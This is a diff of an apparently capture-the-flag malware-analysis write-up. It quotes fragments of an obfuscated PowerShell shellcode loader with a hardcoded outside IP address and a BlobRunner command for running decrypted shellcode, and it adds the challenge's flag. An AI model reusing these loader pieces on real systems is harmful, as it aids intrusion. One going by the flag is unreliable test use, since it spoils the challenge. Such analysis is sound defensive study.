@@ -34,13 +34,13 @@ And `4A7xH.ps1` is a Powershell script.
 
 The Powershell script is a little obfuscated:
 
-```powershell
+```shell
 sV  ("{0}{1}" -f'Y','uE51') ([typE]("{5}{0}{2}{3}{1}{4}"-f 'STeM','EcTIOn.aS','.REF','L','SemblY','Sy'));  ${a} = ("{0}{1}{2}{3}{4}" -f 'cu','rr','en','tth','read')
 ```
 
 Still it can be executed instruction by instruction to unveil its meaning:
 
-```powershell
+```shell
 sV ('YuE51')([type] 'SySTeM.REFLEcTIOn.aSSemblY')
 ${a} = 'currentthread'
 ${b} = '147.182.172.189'
@@ -145,7 +145,7 @@ code in [BlobRunner][blobrunner].
 
 In the command prompt:
 
-```powershell
+```shell
 .\blobrunner.exe .\shellcode.aes.bin
 ```
 After attaching [x32dbg][x32dbg], the "memory map" tab helps us navigate to the
@@ -155,6 +155,8 @@ Running step by step, the process reaches a XOR loop, which generates the follow
 
 ![][flag]
 
+> `HTB{00000ps_1_t0t4lly_f0rg0t_1t}`
+
 [author-profile]: https://app.hackthebox.com/users/70891
 [blobrunner]: https://github.com/OALabs/BlobRunner
 [cradle-script]: https://github.com/snovvcrash/DInjector/blob/main/cradle.ps1
@@ -162,3 +164,4 @@ Running step by step, the process reaches a XOR loop, which generates the follow
 [flag]: images/screenshot-flag.png
 [encryption-script]: https://github.com/snovvcrash/DInjector/blob/main/encrypt.py
 [snovvcrash]: https://github.com/snovvcrash
+[x32dbg]: https://x64dbg.com/
